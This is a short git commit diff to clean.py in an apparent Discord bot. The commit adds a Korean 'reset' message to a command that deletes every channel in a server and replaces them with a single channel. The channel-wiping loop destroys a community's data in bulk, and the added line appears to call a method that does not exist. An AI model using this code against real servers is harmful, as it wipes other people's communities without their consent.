1a211e930250fb36adbce1b184b7b792d7cfcbc7
J4ck0505 <80529490+J4ck0505@users.noreply.github.com>
2021-04-22 16:54:56 +0900

    Update clean.py

--- clean.py
+++ clean.py
@@ -25,6 +25,7 @@ async def clean(ctx):
     for channel in guild.channels:
         await channel.delete()
     await ctx.guild.create_text_channel("ㅋ")
+    await ctx.message.send("이기야 초기화")
         
 @client.command()
 async def invite(ctx):
